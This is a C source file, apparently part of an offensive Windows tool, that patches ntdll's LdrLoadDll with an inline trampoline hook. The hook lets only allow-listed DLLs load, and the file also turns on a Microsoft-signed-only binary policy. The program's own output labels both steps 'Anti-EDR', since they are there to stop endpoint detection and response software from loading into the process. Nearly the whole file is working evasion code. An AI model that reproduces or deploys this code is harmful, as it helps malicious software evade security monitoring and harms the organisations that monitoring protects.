#include <stdio.h>
#include <windows.h>
#include <winternl.h>


const char cAllowDlls[][MAX_PATH] = {
    "api-ms-win-core-",
    "kernel32",
    "rpcrt4.",
    "ntdll.",
    "user32.",
    "winhttp.",
    "mswsock.",
    "schannel.",
    "rsaenh.",
    "OnDemandConnRouteHelper.",
    "IMM32.",
    "bcryptprimitives.",
    "ncryptsslp.",
    "mskeyprotect.",
    "ondemandconnroutehelper.",
    "sspicli.",
    "KernelBase"
};


NTSTATUS __stdcall _LdrLoadDll(PWSTR SearchPath OPTIONAL, PULONG DllCharacteristics OPTIONAL, PUNICODE_STRING DllName, PVOID* BaseAddress);

typedef void (WINAPI* LdrLoadDll_) (PWSTR SearchPath OPTIONAL,
    PULONG DllCharacteristics OPTIONAL,
    PUNICODE_STRING DllName,
    PVOID* BaseAddress);

LPVOID lpAddr;
CHAR OriginalBytes[50];


#ifdef _WIN64

VOID HookLoadDll64(LPVOID lpAddr) {
    DWORD oldProtect;// , oldOldProtect;
    void* hLdrLoadDll = &_LdrLoadDll;

    // our trampoline 
    unsigned char patch[] = {
        0x49, 0xbb,
        0xFF, 0xFF, 0xFF, 0xFF,
        0xFF, 0xFF, 0xFF, 0xFF,
        0x41, 0xff, 0xe3
    };

    // add in the address of our hook
    *(void**)(patch + 2) = &_LdrLoadDll;

    // write the hook
    VirtualProtect(lpAddr, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(lpAddr, patch, sizeof(patch));
    VirtualProtect(lpAddr, sizeof(patch), oldProtect, &oldProtect);

    return;
}
#else
VOID HookLoadDll32(LPVOID lpAddr) {
    DWORD oldProtect;// , oldOldProtect;
    void* hLdrLoadDll = &_LdrLoadDll;

    // our trampoline 
    unsigned char patch[6] = {
        0x68,
        0xFF,0xFF,0xFF,0xFF,
        0xc3
    };
    *(void**)(patch + 1) = &_LdrLoadDll;

    // write the hook
    VirtualProtect(lpAddr, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(lpAddr, patch, sizeof(patch));
    VirtualProtect(lpAddr, sizeof(patch), oldProtect, &oldProtect);

    return;
}
#endif

NTSTATUS __stdcall _LdrLoadDll(PWSTR SearchPath OPTIONAL, PULONG DllCharacteristics OPTIONAL, PUNICODE_STRING DllName, PVOID* BaseAddress) {
    INT i;
    DWORD dwOldProtect = 0;
    BOOL bAllow = FALSE;
    //DWORD dwbytesWritten;
    CHAR cDllName[MAX_PATH];

    sprintf_s(cDllName, MAX_PATH, "%ws", DllName->Buffer);

    for (i = 0; i < sizeof(cAllowDlls) / MAX_PATH; i++) {
        if (strstr(cDllName, cAllowDlls[i]) != NULL) {
            bAllow = TRUE;

            VirtualProtect(lpAddr, sizeof(OriginalBytes), PAGE_EXECUTE_READWRITE, &dwOldProtect);
            memcpy(lpAddr, OriginalBytes, sizeof(OriginalBytes));
            VirtualProtect(lpAddr, sizeof(OriginalBytes), dwOldProtect, &dwOldProtect);
            HANDLE hNtdll = GetModuleHandleA("ntdll.dll");
            if (hNtdll == NULL)
                return FALSE;
            LdrLoadDll_ LdrLoadDll = (LdrLoadDll_)GetProcAddress(hNtdll, "LdrLoadDll");
            LdrLoadDll(SearchPath, DllCharacteristics, DllName, BaseAddress);
#ifdef _WIN64
            HookLoadDll64(lpAddr);
#else
            HookLoadDll32(lpAddr);
#endif
        }

    }

    if (!bAllow) {
        printf("[!] Blocked DLL: %s\n", cDllName);
    }
    return TRUE;
}
BOOL SetHook() {
    HANDLE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL)
        return FALSE;

    lpAddr = (LPVOID)GetProcAddress(hNtdll, "LdrLoadDll");
    if (lpAddr == NULL)
        return FALSE;

    // save the original bytes
    memcpy(OriginalBytes, lpAddr, 50);
#ifdef _WIN64
    HookLoadDll64(lpAddr);
#else
    HookLoadDll32(lpAddr);
#endif
    return TRUE;
}

BOOL EnableACG() {
    PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY SigPolicy;
    ZeroMemory(&SigPolicy, sizeof(PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY));
    SigPolicy.MicrosoftSignedOnly = 1;
    return SetProcessMitigationPolicy(ProcessSignaturePolicy, &SigPolicy, sizeof(PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY));
}

int SetSecurity() {
    int result = 0;

    if (SetHook()) {
        printf("[+] Anti-EDR - LdrLoadDll hook set\n");
        result++;
    } else {
        printf("[!] Fail to set anti-EDR LdrLoadDll hook\n");
    }
    if (EnableACG()) {
        printf("[+] Anti-EDR - ACG enable\n");
        result++;
    } else {
        printf("[!] Fail to enable ACG\n");
    }
    return result;
}